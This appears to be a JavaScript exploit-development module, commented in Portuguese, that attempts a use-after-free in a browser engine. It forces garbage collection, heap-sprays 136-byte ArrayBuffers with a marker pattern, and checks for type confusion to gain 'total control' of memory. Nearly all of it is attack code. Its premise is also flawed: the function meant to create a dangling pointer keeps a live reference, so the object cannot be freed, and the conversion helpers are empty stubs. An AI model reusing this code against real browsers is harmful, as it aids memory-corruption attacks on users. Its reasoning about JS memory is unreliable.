// js/script3/testArrayBufferVictimCrash.mjs (v127 - Estratégia Use-After-Free)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - PIVOT DE ESTRATÉGIA: Abandonada a abordagem de JIT Type Confusion em favor de uma
//   estratégia de Use-After-Free (UAF) baseada no código do arquivo Crash.txt.
// - FOCO NO CONTROLE: O objetivo é transformar o crash observado em uma confusão de tipos
//   controlada, onde um ponteiro para um objeto liberado é usado para acessar um
//   ArrayBuffer que nós controlamos.
// - HEAP SPRAYING: Implementada a lógica de forçar o Garbage Collector e, em seguida,
//   pulverizar o heap para tomar controle da memória liberada.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "UAF_v127_ControlledCrash";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) { /* ...código sem alterações... */ }
function doubleToInt64(double) { /* ...código sem alterações... */ }

// --- Funções Auxiliares para a Cadeia de Exploração UAF (do v82) ---
async function triggerGC_Hyper() {
    logS3("    Acionando GC Agressivo (Hyper)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) { // Reduzido um pouco para evitar lentidão excessiva
            gc_trigger_arr.push(new ArrayBuffer(1024 * i));
            gc_trigger_arr.push(new Array(1024 * i).fill(0));
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Hyper, como esperado.", "info");
    }
    await PAUSE_S3(250); // Pausa para o GC atuar
}

function createDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        // Objeto vítima com tamanho aproximado de 136 bytes
        const victim = {
            p1: 0.1, p2: 0.2, p3: 0.3, p4: 0.4, p5: 0.5,
            p6: 0.6, p7: 0.7, p8: 0.8, p9: 0.9, p10: 0.11,
            p11: 0.12, p12: 0.13, p13: 0.14, p14: 0.15, p15: 0.16,
            p16: 0.17,
            corrupted_prop: { original: true } // Propriedade que vamos verificar
        };
        dangling_ref_internal = victim;
    }
    createScope();
    return dangling_ref_internal;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Tentativa de UAF Controlado ---`, "test");

    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let spray_buffers = [];

    try {
        // --- FASE 1: Criar o Ponteiro Pendurado ---
        logS3("--- FASE 1: Criando um ponteiro pendurado (Use-After-Free)... ---", "subtest");
        const dangling_ref = createDanglingPointer();
        logS3("    Ponteiro pendurado criado. A referência agora é potencialmente inválida.", "warn");

        // --- FASE 2: Forçar a Coleta de Lixo para liberar a memória do objeto ---
        logS3("--- FASE 2: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
        await triggerGC_Hyper();
        await triggerGC_Hyper();
        logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");

        // --- FASE 3: Pulverizar o heap para reocupar a memória liberada ---
        logS3("--- FASE 3: Pulverizando ArrayBuffers sobre a memória liberada... ---", "subtest");
        for (let i = 0; i < 2048; i++) {
            const buf = new ArrayBuffer(136); // Mesmo tamanho do objeto vítima
            const view = new BigUint64Array(buf);
            // Padrão de bytes para identificar nosso buffer
            view[0] = 0x4141414141414141n; 
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
        
        // --- FASE 4: Verificar a Confusão de Tipos (a etapa que causava o crash) ---
        logS3("--- FASE 4: Verificando a confusão de tipos no ponteiro pendurado... ---", "subtest");
        
        try {
            const prop = dangling_ref.corrupted_prop;
            const prop_type = typeof prop;
            logS3(`[VERIFICAÇÃO] O tipo da propriedade é agora: '${prop_type}'`, "leak");

            // Se o tipo mudou para 'number', significa que estamos lendo os bits
            // do nosso spray como um double, o que é um SUCESSO!
            if (prop_type === 'number') {
                logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
                const leaked_bits = doubleToInt64(prop);
                logS3(`Bits vazados da propriedade: ${toHex(leaked_bits)}`, "leak");
                
                // Verificamos se os bits vazados correspondem ao nosso padrão de spray
                if (leaked_bits.high() === 0x41414141 && leaked_bits.low() === 0x41414141) {
                    logS3("CONFIRMADO: Os bits vazados correspondem ao nosso padrão de spray! Controle total!", "vuln");
                    final_result = { success: true, message: "Controle de memória via UAF confirmado." };
                } else {
                    final_result = { success: true, message: "Confusão de tipos ocorreu, mas os bits não correspondem ao padrão." };
                }
            } else {
                 throw new Error(`Falha no UAF. Tipo da propriedade era '${prop_type}', esperado 'number'. O objeto pode não ter sido liberado.`);
            }
        } catch(e) {
            logS3(`Ocorreu um erro ao acessar a propriedade pendurada, o que pode indicar um crash evitado: ${e.message}`, "error");
            throw new Error("Acesso à memória pendurada falhou, mas foi capturado. O crash foi evitado, mas a exploração falhou.");
        }

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
